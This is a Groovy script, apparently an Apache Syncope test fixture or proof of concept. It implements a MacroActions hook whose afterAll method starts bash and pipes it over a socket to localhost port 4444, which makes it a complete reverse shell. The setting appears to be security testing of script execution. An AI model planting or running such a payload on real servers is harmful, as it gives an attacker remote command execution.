/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
import groovy.transform.BaseScript
import org.apache.syncope.core.provisioning.api.macro.MacroActions
import java.io.Serializable
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

abstract class ProcessBuilderMacroActions extends Script implements MacroActions {}
@BaseScript ProcessBuilderMacroActions _

@Override
StringBuilder afterAll(StringBuilder output) {
  String host = "localhost";
  int port = 4444;
  String cmd = "bash";

  Process p = new ProcessBuilder(cmd)
  .redirectErrorStream(true)
  .start();

  Socket s = new Socket(host, port);

  InputStream pi = p.getInputStream();
  InputStream pe = p.getErrorStream();
  InputStream si = s.getInputStream();

  OutputStream po = p.getOutputStream();
  OutputStream so = s.getOutputStream();

  while (!s.isClosed()) {
    while (pi.available() > 0) {
      so.write(pi.read());
    }
    while (pe.available() > 0) {
      so.write(pe.read());
    }
    while (si.available() > 0) {
      po.write(si.read());
    }

    so.flush();
    po.flush();

    Thread.sleep(1);

    try {
      p.exitValue();
      break;
    } catch (Exception e) {
      // ignored
    }
  }
  ;
  p.destroy();
  s.close();

  output.append('\nShell started...\n')
  return output
}
